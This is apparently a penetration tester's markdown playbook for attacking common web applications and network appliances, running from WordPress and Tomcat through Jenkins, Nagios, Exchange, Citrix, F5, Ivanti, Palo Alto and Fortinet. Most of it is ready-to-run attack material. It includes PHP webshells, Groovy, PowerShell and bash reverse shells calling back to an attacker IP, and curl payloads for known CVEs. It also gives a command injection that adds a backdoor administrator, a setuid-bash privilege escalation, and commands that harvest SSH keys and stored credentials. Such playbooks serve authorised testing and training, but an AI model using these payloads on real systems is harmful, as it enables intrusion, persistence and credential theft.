# Attacking Common Applications

#WebApps #CMS #WordPress #Joomla #Drupal #Tomcat #Jenkins #Splunk #PRTG #GitLab #ColdFusion #ThickClient #Nagios #Exchange #Citrix #F5 #Ivanti #Fortinet #PaloAlto #ManageEngine #TeamCity #Kubernetes #Docker #Zimbra #SolarWinds #Enumeration #RCE

## What is this?

Per-application playbook for the most common web apps and services encountered during internal/external pentests. Covers enumeration, default creds, known exploit paths, and RCE techniques. For web attack primitives (SQLi, XSS, LFI, etc.) see [[SQL Injection]], [[File Inclusion]], [[Cross-Site Scripting]].

---

## Application Categories

| Category | Common Apps |
|---|---|
| CMS | WordPress, Joomla, Drupal, DotNetNuke |
| App Servers | Apache Tomcat, Oracle WebLogic, IBM WebSphere, JBoss, Axis2 |
| CI/CD | Jenkins, GitLab, TeamCity, Bitbucket |
| SIEM / Monitoring | Splunk, PRTG, Nagios, Zabbix, SolarWinds Orion |
| Ticketing / ITSM | osTicket, Zendesk, ManageEngine ServiceDesk Plus |
| Dev Tools | phpMyAdmin, Confluence, Elasticsearch |
| Email | Exchange / OWA, Zimbra |
| Network / VPN Appliances | Citrix NetScaler, F5 BIG-IP, Ivanti/Pulse Secure, Palo Alto GlobalProtect, Fortinet |
| IT Management | ManageEngine (ADManager, ADSelfService, Desktop Central, OpManager) |
| Container / Orchestration | Docker API, Kubernetes, Portainer |
| Thick Clients | .NET/Java/C++ desktop apps |

---

## Recon Workflow

```bash
# Nmap — find web services
nmap -sV -sC -p 80,443,8000,8080,8443,8888 10.10.10.10
nmap -sV --script=http-title,http-headers 10.10.10.0/24

# Visual recon — screenshot all discovered web services
eyewitness --web -f targets.txt --no-prompt -d eyewitness_out
cat scope.txt | aquatone -out aquatone_out

# Tech fingerprinting
whatweb http://10.10.10.10
httpx -l hosts.txt -tech-detect -title -status-code
```

> [!note]
> EyeWitness and Aquatone output lets you quickly spot default installs, login pages, and unprotected admin panels across large target lists without clicking through every host manually.

---

## WordPress

### Enumeration

```bash
# Version — multiple sources
curl -s http://target.com/ | grep 'WordPress'
curl -s http://target.com/wp-login.php | grep 'ver='
curl -s http://target.com/readme.html | grep -i version

# wpscan — full enum (users, plugins, themes, vulns)
wpscan --url http://target.com --enumerate u,ap,at,tt,cb,dbe --plugins-detection aggressive
wpscan --url http://target.com -e u --passwords /usr/share/wordlists/rockyou.txt

# Interesting paths
/wp-login.php           # admin login
/xmlrpc.php             # XML-RPC API (brute force / SSRF)
/wp-content/uploads/    # uploaded files
/wp-content/plugins/    # installed plugins
/wp-content/themes/     # installed themes
/wp-json/wp/v2/users    # user enumeration via REST API (unauthenticated)
```

### Attacking

```bash
# Brute force login
wpscan --url http://target.com -U admin -P /usr/share/wordlists/rockyou.txt

# XML-RPC brute force (bypasses lockout on some configs)
wpscan --url http://target.com --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt
```

**RCE via Theme Editor (authenticated admin):**
1. Appearance → Theme Editor → select an inactive theme → edit `404.php`
2. Insert PHP webshell: `<?php system($_GET['cmd']); ?>`
3. Navigate to `http://target.com/wp-content/themes/<theme>/404.php?cmd=id`

**RCE via Plugin Upload (authenticated admin):**

```bash
# Metasploit
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD Password123
run
```

**Plugin-specific vulns:**

```bash
# mail-masta — LFI (unauthenticated)
curl -s 'http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'

# wpDiscuz 7.0.4 — unauthenticated RCE (CVE-2020-24186)
python3 wp_discuz.py -u http://target.com -p /?p=1
# https://www.exploit-db.com/exploits/49967
```

---

## Joomla

### Enumeration

```bash
# Version
curl -s http://target.com/README.txt | head -n 5
curl -s http://target.com/administrator/manifests/files/joomla.xml | grep '<version>'
curl -s 'https://developer.joomla.org/stats/cms_version' | python3 -m json.tool

# Automated scanners
droopescan scan joomla --url http://target.com/
python3 joomscan.py -u http://target.com     # joomscan (preferred over joomlascan)
python2.7 joomlascan.py -u http://target.com  # older alt

# Interesting paths
/administrator             # admin login
/configuration.php         # config (not directly readable but look for backups)
/htaccess.txt
/web.config.txt
/LICENSE.txt
```

### Attacking

```bash
# Brute force admin login
python3 joomla_bruteforce.py -u http://target.com -user admin -wordlist /usr/share/wordlists/rockyou.txt
# https://github.com/ajnik/joomla-bruteforce
```

**RCE via Template Editor (authenticated admin):**
1. Extensions → Templates → Templates → select a template
2. Edit any `.php` file (e.g., `error.php`)
3. Insert: `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`
4. Preview: `http://target.com/templates/<template>/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`

**CVEs:**
- CVE-2023-23752 — Unauthenticated information disclosure (config data including DB creds)
  ```bash
  curl 'http://target.com/api/index.php/v1/config/application?public=true'
  ```

---

## Drupal

### Enumeration

```bash
# Version
curl -s http://target.com/CHANGELOG.txt | head -5
curl -s http://target.com/core/CHANGELOG.txt | head -5    # Drupal 8+
droopescan scan drupal -u http://target.com

# Interesting paths
/user/login            # login
/admin                 # admin panel
/node/1                # first node — sometimes reveals version
/?q=user/login         # older Drupal URL format
```

### Attacking

**PHP Filter module — RCE (Drupal 7, module must be enabled):**

```bash
# If PHP filter is enabled — add PHP code directly to a node
# Navigate to: Modules → PHP filter → enable
# Content → Add content → Basic page → set text format to "PHP code"
# Body: <?php system($_GET['cmd']); ?>
# Access: http://target.com/node/<id>?cmd=id

# If PHP filter missing (Drupal 8+) — install it manually
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

**RCE via Custom Module upload:**

```bash
# Download a legit module to use as a wrapper
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create shell and .htaccess inside module dir
echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' > captcha/shell.php
cat > captcha/.htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Repack and upload via admin
tar cvf captcha.tar.gz captcha/
# Extend → Install new module → upload captcha.tar.gz

# Trigger shell
curl 'http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id'
```

**CVEs (Drupalgeddon):**
- Drupalgeddon (SA-CORE-2014-005) — SQLi → RCE — Drupal < 7.32
- Drupalgeddon2 (CVE-2018-7600) — Unauthenticated RCE — Drupal < 7.58 / 8.x < 8.3.9
- Drupalgeddon3 (CVE-2018-7602) — Authenticated RCE — Drupal 7.x / 8.x

```bash
# Drupalgeddon2
python3 drupalgeddon2.py http://target.com
```

---

## Apache Tomcat

### Enumeration

```bash
# Version fingerprint
curl -s http://target.com:8080/docs/ | grep Tomcat
# 404/500 error pages often leak version

# Nmap
nmap -sV -p 8080,8443,8009 target.com

# Dir brute — find manager
gobuster dir -u http://target.com:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Manager login paths
/manager/html              # GUI manager
/manager/text              # text-based manager (used by scripts)
/host-manager/html
```

**Default credentials:** `tomcat:tomcat` | `admin:admin` | `admin:password` | `tomcat:s3cret`

```bash
# MSF — brute force manager creds
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 10.10.10.10
set RPORT 8080
set STOP_ON_SUCCESS true
run

# Script alt
python3 tomcat_brute.py -u http://target.com:8080 -w /usr/share/wordlists/rockyou.txt
# https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
```

### Attacking

**WAR file upload → webshell (authenticated manager):**

```bash
# Option 1 — JSP webshell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r shell.war cmd.jsp
# Upload via /manager/html → WAR file to deploy
# Access: http://target.com:8080/shell/cmd.jsp?cmd=id
```

**WAR file upload → reverse shell:**

```bash
# Option 2 — msfvenom reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f war -o shell.war
nc -lvnp 4444
# Upload via manager → access http://target.com:8080/shell/

# Option 3 — MSF module (with valid creds)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.10.10.10
set HttpUsername tomcat
set HttpPassword tomcat
run
```

**CVE-2020-1938 — Ghostcat (AJP LFI):**

```bash
# AJP connector on port 8009 — reads arbitrary webapp files
python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml
# https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
# Read web.xml for creds → pivot to manager upload
```

### Key File Locations

| Path | Purpose |
|---|---|
| `conf/tomcat-users.xml` | Cleartext manager credentials |
| `conf/server.xml` | Connector config, ports, AJP settings |
| `webapps/` | Default webroot — deployed apps live here |
| `webapps/ROOT/WEB-INF/web.xml` | App deployment descriptor |
| `logs/catalina.out` | Main log — version, errors, stack traces |

---

## Jenkins

### Enumeration

```bash
# Default ports: 8080 (web), 5000 (agent JNLP)
# Auth: local DB / LDAP / AD / none
# Default creds: admin:admin (check /var/lib/jenkins/secrets/initialAdminPassword on Linux)

# Interesting URLs
/asynchPeople/            # user enumeration (no auth on some versions)
/systemInfo               # system info (requires auth)
/script                   # Groovy Script Console — direct RCE if accessible
/credentials/             # stored credentials
/manage                   # management console
```

### Attacking

**Groovy Script Console RCE — Linux:**

```groovy
// Execute command
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Groovy Script Console RCE — Linux reverse shell:**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash", "-c", "exec 5<>/dev/tcp/10.10.14.15/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Groovy Script Console RCE — Windows:**

```groovy
// Run command
def cmd = "cmd.exe /c whoami"
def proc = cmd.execute()
println proc.text
```

**Groovy Script Console RCE — Windows reverse shell:**

```groovy
String host = "10.10.14.15"
int port = 4444
String cmd = "cmd.exe"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read())
    while (pe.available() > 0) so.write(pe.read())
    while (si.available() > 0) po.write(si.read())
    so.flush(); po.flush()
    Thread.sleep(50)
    try { p.exitValue(); break } catch (Exception e) {}
}
p.destroy(); s.close()
```

> [!note]
> If `/script` requires auth, check for CVE-2024-23897 (arbitrary file read via CLI parser) or older unauthenticated RCE CVEs. Also check stored credentials at `/credentials/` — these often contain SSH keys, API tokens, or domain creds.

---

## Splunk

### Enumeration

```bash
# Default ports: 8000 (web), 8089 (management/REST API), 9997 (forwarder)
# Free license = no auth required
# URL: http://target.com:8000/en-US/account/login

# REST API check (no auth on some deployments)
curl -k https://target.com:8089/services/server/info
```

### Attacking

**RCE via Custom App (authenticated):**

```bash
# Use pre-built reverse shell app
git clone https://github.com/0xjpuff/reverse_shell_splunk
# Edit run.ps1 (Windows) or run.sh (Linux) with your LHOST/LPORT

# Package and upload
tar -cvzf splunk_shell.tar.gz reverse_shell_splunk/
# Apps → Manage Apps → Install app from file → upload .tar.gz
# Start your listener before uploading — shell fires on install
```

**Windows payload (`bin/run.ps1`):**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

> [!note]
> Splunk forwarder agents running on servers also accept app deployments if you have management port access. Even without the web UI, a compromised forwarder = RCE on that host.

---

## PRTG Network Monitor

### Enumeration

```bash
# Default ports: 80, 443, 8080
# Default creds: prtgadmin:prtgadmin (older versions: prtgadmin:PrtgAdmin!)
# Admin path: http://target.com/index.htm
```

### Attacking

**CVE-2018-9276 — Authenticated RCE via notification command injection:**

```bash
# Setup → Account Settings → Notifications → Add new notification
# Set trigger: execute program
# Parameter field — inject command:
# test.txt;net user prtgbackdoor Password123! /add;net localgroup administrators prtgbackdoor /add

# Then trigger the notification via sensor alert or manual trigger
```

**Default credential check + version:**

```bash
# Check for config backup containing old creds
# Windows path: C:\ProgramData\Paessler\PRTG Network Monitor\
# File: PRTG Configuration.old.bak — often has cleartext credentials
```

> [!note]
> The config backup file `PRTG Configuration.old.bak` is a goldmine — it frequently contains the previous admin password in cleartext, and admins often increment it by 1 digit when prompted to change it.

---

## osTicket

### Enumeration

```bash
# PHP-based ticketing system — Apache or IIS, MySQL backend
# Cookie: OSTSESSID
# Version: usually on the login page footer or /scp/admin.php

# Interesting paths
/scp/login.php       # staff/admin login
/scp/admin.php       # admin panel (requires admin role)
/open.php            # submit a new ticket (often public)
```

### Attacking

```bash
# Check for CVEs — searchsploit
searchsploit osticket

# Create an account and submit tickets
# Look for: file upload → webshell, email injection, info disclosure in ticket responses
# Staff portal may reveal internal email addresses → use for password spray
```

> [!note]
> osTicket integrations often pull email — check if you can find email credentials in the config, or if the ticket system reveals internal usernames/email formats useful for AD spraying.

---

## GitLab

### Enumeration

```bash
# Default port: 80/443
# Version: http://target.com/help → shows version (no auth needed on many installs)
# Public projects: http://target.com/explore/projects?visibility=public

# User enumeration via sign-up (username taken = different response)
# API: http://target.com/api/v4/users?per_page=100 (if public API enabled)
```

### Attacking

```bash
# Register an account → browse public repos for secrets
# Search for: password, secret, key, token, .env, id_rsa

# Check CVEs for your version — GitLab has had critical RCE vulns
searchsploit gitlab

# Notable CVEs
# CVE-2021-22205 — Unauthenticated RCE via image parsing (ExifTool) — GitLab < 13.10.3
# CVE-2023-7028 — Account takeover via password reset (no user interaction)
```

```bash
# CVE-2021-22205 PoC
python3 exploit.py -t http://target.com -l 10.10.14.15 -p 4444
# https://github.com/inspiringz/CVE-2021-22205
```

---

## Tomcat CGI

### Overview

CGI (Common Gateway Interface) lets Tomcat pass requests to external scripts (Bash, Python, Perl, C). Usually found at `/cgi-bin/`.

### Enumeration

```bash
# Scan for CGI scripts
ffuf -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u http://target.com/cgi-bin/FUZZ
nmap --script http-shellshock --script-args uri=/cgi-bin/status target.com
```

### Attacking

**Command injection (Windows — CGI parameter):**

```
GET /cgi-bin/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe HTTP/1.1
```

**Shellshock (CVE-2014-6271) — Bash CGI scripts:**

```bash
# Test
curl -H "User-Agent: () { :; }; echo; echo vulnerable" http://target.com/cgi-bin/status

# Reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.15/4444 0>&1" http://target.com/cgi-bin/status
```

---

## ColdFusion

### Enumeration

| Port | Protocol | Purpose |
|---|---|---|
| 80 | HTTP | Web |
| 443 | HTTPS | Web (SSL) |
| 8500 | HTTP/HTTPS | ColdFusion admin (sometimes) |
| 1935 | RPC | RPC protocol |
| 5500 | CF Monitor | Remote admin |

```bash
# Fingerprint
curl -s http://target.com/ | grep -i coldfusion
curl -s http://target.com/CFIDE/administrator   # admin portal
# File extensions: .cfm, .cfc
# Headers: X-Powered-By: ColdFusion
```

**IIS Short Name (Tilde) Enumeration:**

```bash
# Enumerate 8.3 short filenames on IIS
java -jar iis_shortname_scanner.jar 0 5 http://target.com/
# https://github.com/irsdl/IIS-ShortName-Scanner

# Build wordlist from discovered prefix (e.g. "transf")
grep -r "^transf" /usr/share/seclists/Discovery/Web-Content/ | sed 's/^[^:]*://' > /tmp/transf_words.txt

# Brute force full filename
gobuster dir -u http://target.com/ -w /tmp/transf_words.txt -x .aspx,.asp
```

### Attacking

```bash
# Known CVEs — check version first
searchsploit coldfusion

# CVE-2010-2861 — Directory traversal → admin hash disclosure
curl 'http://target.com/CFIDE/administrator/enter.cfm?locale=../../../../../../ColdFusion8/lib/password.properties%00en'

# CVE-2009-2265 — Unauthenticated file upload → RCE (CF8)
python3 cfusion_upload.py http://target.com
```

---

## Thick Clients

### Overview

- **2-tier:** app communicates directly with DB
- **3-tier:** app → server → DB (more common)
- Languages: C++, Java, .NET, Electron
- Goal: find creds in memory/disk, intercept traffic, find injectable params

### Enumeration Tools

| Tool | Purpose |
|---|---|
| CFF Explorer | PE header analysis, imports, resources |
| Detect It Easy (DIE) | Language/packer/compiler fingerprinting |
| Process Monitor (Procmon) | File, registry, network activity |
| Strings (Sysinternals) | Extract strings from binary |
| TCPView | Active network connections per process |
| Wireshark / tcpdump | Traffic capture |
| Burp Suite | HTTP/HTTPS proxy (set system proxy) |

### Attack Tools

| Tool | Purpose |
|---|---|
| x64dbg | Dynamic analysis, memory dump, patching |
| dnSpy | .NET decompile and debug |
| JADX / JD-GUI | Java decompile |
| Ghidra / IDA / Radare2 | Static reverse engineering |
| OllyDbg | x86 dynamic analysis (older) |
| Frida | Dynamic instrumentation (hook functions at runtime) |

### Methodology

```
1. Fingerprint → DIE to identify language/framework
2. Static → strings, decompile (.NET: dnSpy, Java: JADX/JD-GUI, native: Ghidra)
3. Dynamic → Procmon during login/action → find config files, reg keys, temp files
4. Traffic → Wireshark/Burp → look for unencrypted comms, weak TLS, injectable params
5. Memory → x64dbg → dump memory → strings → credentials, keys
6. Credentials → check config files, registry, install dir for hardcoded creds
```

```bash
# Frida — hook function and print args (example)
frida -l hook.js -f target.exe --no-pause

# Strings on a .NET binary
strings target.exe | grep -i "pass\|key\|secret\|connect"
```

---

## Other Notable Apps

| Application | Default Creds | Key Attack Path |
|---|---|---|
| **Axis2** | `admin:axis2` | Upload malicious AAR service file → RCE (similar to Tomcat WAR) |
| **WebSphere** | `system:manager` | WAR deployment via admin console → RCE |
| **WebLogic** | `weblogic:weblogic1` | Java deserialization (190+ CVEs) — check version |
| **Nagios** | `nagiosadmin:PASSW0RD` | Authenticated RCE via command injection, privesc to root |
| **Zabbix** | `Admin:zabbix` | Built-in script execution → RCE; API accessible at `/api_jsonrpc.php` |
| **Elasticsearch** | none (older) | Unauthenticated data access; check for Groovy/Painless script injection |
| **DotNetNuke (DNN)** | `admin:password` | Auth bypass, file upload bypass, directory traversal CVEs |
| **vCenter** | `administrator@vsphere.local` | CVE-2021-22005 (unauth OVA upload → RCE); shell often runs as SYSTEM/DA |
| **phpMyAdmin** | `root:` (no pass) | SQL → write webshell via `SELECT INTO OUTFILE` |
| **Confluence** | `admin:admin` | CVE-2022-26134 (unauth OGNL injection → RCE) |
| **MediaWiki** | `admin:admin` | Template injection, file upload, check for `LocalSettings.php` creds |

---

## Nagios

### Overview

Two flavors — **Nagios Core** (open source) and **Nagios XI** (commercial). XI is far more common on enterprise engagements and has a much larger attack surface. Nagios typically runs as the `nagios` user and monitors every host on the network — config files often contain SSH keys, SNMP strings, and WMI credentials for every monitored device.

### Enumeration

```bash
# Default ports: 80, 443
# Core path:  /nagios/
# XI path:    /nagiosxi/

curl -sk http://target.com/nagiosxi/ | grep -i "nagios\|version"
curl -sk http://target.com/nagios/  # Core

# Version — XI footer or about page
curl -sk http://target.com/nagiosxi/about.php | grep -i version

# Nmap
nmap -sV -p 80,443 --script=http-title target.com
```

**Default credentials:**
- Nagios XI: `nagiosadmin:nagiosadmin` or `nagiosadmin:PASSW0RD`
- Nagios Core: `nagiosadmin:nagiosadmin`

### Attacking

**CVE-2021-25296 / 25297 / 25298 — Authenticated OS command injection (Nagios XI < 5.7.5):**

```bash
# Three separate injection points — Monitored Servers, MIB Manager, Network Interfaces
python3 CVE-2021-25296.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin -l 10.10.14.15 -p 4444
```

**CVE-2019-15949 — Authenticated RCE (Nagios XI < 5.6.6):**

```bash
# Plugin upload → command injection via filename
python3 CVE-2019-15949.py -t http://target.com/nagiosxi -u nagiosadmin -p nagiosadmin
```

**CVE-2023-40931 / 40932 / 40933 / 40934 — SQLi (Nagios XI < 5.11.2):**

```bash
# Multiple unauthenticated/authenticated SQL injection points
# /nagiosxi/admin/banner_message-ajaxhelper.php — no auth required
sqlmap -u 'http://target.com/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=1' \
  --batch --dbs
```

**Post-auth RCE via plugin upload (any version with admin access):**

```bash
# Nagios XI Admin → System Extensions → Manage Plugins → Upload Plugin
# Upload a "plugin" that is actually a reverse shell script
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
EOF
# Upload shell.sh as a plugin, then trigger it via a check command
# Admin → Core Config Manager → Commands → Add new command
# command_line: /usr/local/nagios/libexec/shell.sh
```

**Privilege escalation — nagios → root:**

```bash
# Check sudo rules — very common misconfiguration
sudo -l
# Common findings:
# (root) NOPASSWD: /usr/local/nagiosxi/scripts/
# (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/cron/

# If nagios user can write plugin dir and sudo execute:
echo 'chmod +s /bin/bash' > /usr/local/nagios/libexec/evil.sh
chmod +x /usr/local/nagios/libexec/evil.sh
sudo /usr/local/nagios/libexec/evil.sh
/bin/bash -p
```

### Post-Compromise — Credential Harvesting

```bash
# Nagios Core config — host/service check credentials
cat /usr/local/nagios/etc/nagios.cfg
grep -r "password\|community\|ssh" /usr/local/nagios/etc/

# Nagios XI config and DB
cat /usr/local/nagiosxi/etc/components/nagiosxi-master.cfg   # DB creds
mysql -u nagiosxi -p$(grep db_pass /usr/local/nagiosxi/etc/components/nagiosxi-master.cfg | cut -d= -f2) nagiosxi

# SNMP community strings for monitored devices
grep -r "community" /usr/local/nagios/etc/

# SSH keys used for agentless monitoring
ls -la /home/nagios/.ssh/
cat /home/nagios/.ssh/id_rsa
```

> [!note]
> Nagios is a lateral movement goldmine. The monitoring account often has SSH access (sometimes key-based, no password) to every Linux host it monitors. Dumping `/usr/local/nagios/etc/` and the XI database frequently yields credentials for a significant portion of the environment.

---

## Exchange / OWA

### Enumeration

```bash
# Discover Exchange
nmap -p 25,443,587 --script=banner target.com
curl -sk https://target.com/owa/ -I | grep -i "x-owa\|x-ms-diagnostics\|Location"

# Common paths
/owa/                         # Outlook Web Access login
/autodiscover/autodiscover.xml
/ews/exchange.asmx            # Exchange Web Services
/mapi/                        # MAPI over HTTP (Outlook modern auth)
/rpc/                         # RPC over HTTP (older Outlook)
/ecp/                         # Exchange Control Panel (admin)

# Version fingerprint via OWA
curl -sk https://target.com/owa/ | grep -i "version\|14\.\|15\."
# 14.x = Exchange 2010, 15.0 = 2013, 15.1 = 2016, 15.2 = 2019
```

### Password Spray

```bash
# MailSniper — OWA spray (PowerShell)
Invoke-PasswordSprayOWA -ExchHostname target.com -UserList users.txt -Password 'Spring2024!'

# o365spray — works against on-prem OWA too
python3 o365spray.py --spray -U users.txt -P 'Spring2024!' --host target.com --module owa

# ruler — EWS-based spray
ruler --domain target.com brute --users users.txt --passwords passwords.txt --delay 0 --verbose
```

### CVE-Based Attacks

```bash
# ProxyLogon (CVE-2021-26855 + CVE-2021-27065) — Exchange 2013-2019, unauth RCE
# SSRF → auth bypass → arbitrary file write → webshell
python3 proxylogon.py -t https://target.com -e attacker@target.com

# ProxyShell (CVE-2021-34473/34523/31207) — unauth RCE via autodiscover
python3 proxyshell.py -u https://target.com

# CVE-2022-41082 (ProxyNotShell) — authenticated SSRF + RCE
# Requires valid credentials — use after spray
```

> [!note]
> After gaining access via OWA, MailSniper can dump the global address list (all email addresses), search mailboxes for keywords (password, vpn, secret), and enumerate mail forwarding rules — all useful for lateral movement and data collection.

---

## Citrix NetScaler / ADC

### Enumeration

```bash
# Default ports: 80, 443, 8080, 8443
# Admin console: https://target.com/nitro/v1/ (REST API)
# Login page: /logon/LogonPoint/index.html (StoreFront)

curl -sk https://target.com/vpn/index.html | grep -i "citrix\|netscaler\|version"
nmap -sV -p 443,8443 --script=http-title target.com
```

### Attacking

```bash
# CVE-2023-3519 — Unauthenticated RCE (NetScaler ADC/Gateway < 13.1-49.13)
# HTTP GET to /gwtest/formssso triggers buffer overflow
python3 CVE-2023-3519.py -t https://target.com -l 10.10.14.15 -p 4444
# https://github.com/mandiant/CVE-2023-3519

# CVE-2023-24488 — XSS (same version range, lower severity)

# Citrix Bleed (CVE-2023-4966) — session token leak, no auth required
# Leaks memory including valid session tokens → session hijack
python3 citrixbleed.py -t https://target.com
# Use leaked token in cookie: NSC_AAAC=<token>

# Default credentials
# nsroot:nsroot (CLI via SSH port 22)
ssh nsroot@target.com   # if SSH exposed
```

> [!note]
> Citrix Bleed (CVE-2023-4966) was heavily exploited in late 2023 against healthcare, finance, and government targets. If you see a NetScaler/Gateway on an engagement and it's unpatched, this is your entry point — no credentials needed.

---

## F5 BIG-IP

### Enumeration

```bash
# Management console: https://target.com:8443/tmui/login.jsp (TMUI)
# Also: https://target.com/tmui/
# Default creds: admin:admin

curl -sk https://target.com:8443/tmui/login.jsp | grep -i "big-ip\|version"
nmap -sV -p 443,8443,22 target.com
```

### Attacking

```bash
# CVE-2022-1388 — Unauthenticated RCE via iControl REST API (BIG-IP 16.1.x < 16.1.2.2, etc.)
curl -sk -X POST https://target.com/mgmt/tm/util/bash \
  -H "Content-Type: application/json" \
  -H "Authorization: Basic YWRtaW46" \
  -H "X-F5-Auth-Token: a" \
  -H "Connection: keep-alive, X-F5-Auth-Token" \
  -d '{"command":"run","utilCmdArgs":"-c id"}'

# PoC with shell
python3 CVE-2022-1388.py -t https://target.com

# CVE-2020-5902 — Path traversal → RCE via TMUI (BIG-IP < 15.1.0.4)
curl -sk 'https://target.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'

# Post-auth persistence
# TMUI → iRules → create malicious iRule executed on traffic
# Or: tmsh modify auth user admin password newpass
```

---

## Ivanti / Pulse Secure

### Enumeration

```bash
# Pulse Connect Secure VPN — usually port 443
# Login: https://target.com/dana-na/auth/url_default/welcome.cgi
curl -sk https://target.com/ | grep -i "pulse\|ivanti\|juniper"
```

### CVEs

```bash
# CVE-2019-11510 — Unauthenticated arbitrary file read (Pulse Secure < 8.1R15.1/8.3R7.1/9.0R3.4)
curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../tmp/system.log?/dana/html5acc/guacamole/'
curl -sk 'https://target.com/dana-na/../dana/html5acc/guacamole/../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/' > creds.mdb
# Parse data.mdb for plaintext credentials

# CVE-2021-22893 — Unauthenticated RCE (Pulse Connect Secure < 9.1R11.4)
python3 CVE-2021-22893.py -t https://target.com

# CVE-2023-46805 + CVE-2024-21887 — Auth bypass + command injection (Ivanti ICS/IPS < 22.3.x)
curl -sk 'https://target.com/api/v1/totp/user-backup-code/../../license/keys-status/' \
  -H "X-SNS-Header: ;;;id"

# Ivanti DSM (Desktop & Server Management) — CVE-2023-38035
# Unauthenticated access to Sentry admin portal
```

> [!note]
> CVE-2019-11510 yielded plaintext AD credentials in many real-world breaches. Even if patched, check the logs — session tokens and credential files may have been exfiltrated before patching and could still be valid.

---

## Palo Alto GlobalProtect

### Enumeration

```bash
# Default ports: 443 (GlobalProtect portal/gateway), 4443
curl -sk https://target.com/global-protect/login.esp | grep -i "palo\|pan-os\|version"
curl -sk https://target.com/php/login.php -I

# Interesting paths
/global-protect/login.esp     # GP portal login
/ssl-vpn/login.html           # alternate path
/api/                         # PAN-OS XML API
```

### CVEs

```bash
# CVE-2024-3400 — Unauthenticated OS command injection via GlobalProtect (PAN-OS < 11.1.2-h3)
# Requires GlobalProtect gateway or portal enabled
curl -sk 'https://target.com/ssl-vpn/hipreport.esp' \
  -b 'SESSID=/../../../opt/paloaltonetworks/gp/var/log/gp/gpd.log' \
  --data 'user=;id>/tmp/pwned;'

# Full PoC
python3 CVE-2024-3400.py -t https://target.com -c "bash -i >& /dev/tcp/10.10.14.15/4444 0>&1"

# CVE-2019-1579 — Pre-auth RCE (GlobalProtect < 7.1.19/8.0.12/8.1.3)
python3 pan_rce.py https://target.com
```

---

## Fortinet

### Enumeration

```bash
# FortiGate web admin: https://target.com:443 or :8443
# SSL-VPN portal: https://target.com/remote/login
curl -sk https://target.com/remote/login | grep -i "fortinet\|fortigate\|version"
```

### CVEs

```bash
# CVE-2022-40684 — Auth bypass on FortiOS/FortiProxy/FortiSwitchManager admin interface
# Add admin account without authentication
curl -sk -X PUT 'https://target.com/api/v2/cmdb/system/admin/admin' \
  -H 'User-Agent: Report Runner' \
  -H 'Forwarded: for="[127.0.0.1]:8000";by="[127.0.0.1]:9000";' \
  -d '{"ssh-public-key1":"ssh-rsa AAAA..."}'

# CVE-2023-27997 — Heap overflow RCE in SSL-VPN (FortiOS < 6.0.17/6.2.15/6.4.13/7.0.12/7.2.5)
# Pre-auth, no interaction required

# CVE-2024-21762 — Out-of-bounds write in SSL-VPN (FortiOS < 7.4.3)
# Unauthenticated RCE

# Check SSL-VPN for credential exposure
curl -sk 'https://target.com/remote/fgt_lang?lang=/../../../..//dev/cmdb/sslvpn_websession'
# CVE-2018-13379 — plaintext credentials in session files
```

---

## ManageEngine

### Overview

ManageEngine makes 30+ products — all historically vulnerable. Common on enterprise engagements.

| Product | Default Port | Purpose |
|---|---|---|
| ServiceDesk Plus | 8080/8443 | ITSM ticketing |
| ADManager Plus | 8080 | AD management |
